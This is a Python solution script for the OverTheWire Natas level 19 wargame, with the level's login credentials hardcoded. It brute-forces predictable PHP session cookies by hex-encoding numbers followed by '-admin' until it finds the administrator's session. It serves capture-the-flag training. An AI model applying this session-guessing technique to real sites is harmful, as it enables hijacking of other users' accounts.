import requests, string

AUTH=requests.auth.HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
URL = "http://natas19.natas.labs.overthewire.org"

cookie_value = 0
admin_hex = "2d61646d696e"

while True:
  if cookie_value > 640:
    print("Tried all cookie values...")
    break

  cookie_hex = "".join("{:02x}".format(ord(c)) for c in str(cookie_value))
  final_cookie = cookie_hex + admin_hex
  
  cookies = {'PHPSESSID': final_cookie}
  print("\nTrying with cookie: ", str(cookies))
  response = requests.get(URL, auth=AUTH, cookies=cookies)
  
  if "You are logged in as a regular user" in response.text:
    print("Cookie " + final_cookie + " is not correct")
  else:
    print("Correct admin cookie with value " + final_cookie)
    print(response.text)
    break
  cookie_value += 1